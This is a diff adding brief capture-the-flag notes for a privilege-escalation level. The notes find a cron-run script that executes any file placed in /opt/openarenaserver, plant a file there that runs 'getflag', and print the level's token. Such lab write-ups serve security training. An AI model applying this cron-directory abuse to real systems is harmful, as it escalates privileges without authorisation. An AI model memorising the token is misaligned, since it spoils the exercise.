@@ -1,0 +1,17 @@
+run `find / -user flag05` and found openarenaserver files
+/usr/sbin/openarenaserver
+`cat /usr/sbin/openarenaserver`
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+`bash -x "$1"` is running the contents of the file as a bash script
+trying to create file in /opt/openarenaserver/
+`touch /opt/openarenaserver/test`
+wait 1-2 min... and file is gone
+crontab?
+`echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag`
+wait 1-2 min
+`cat /tmp/flag`
+Check flag.Here is your token : viuaaale9huek52boumoomioc
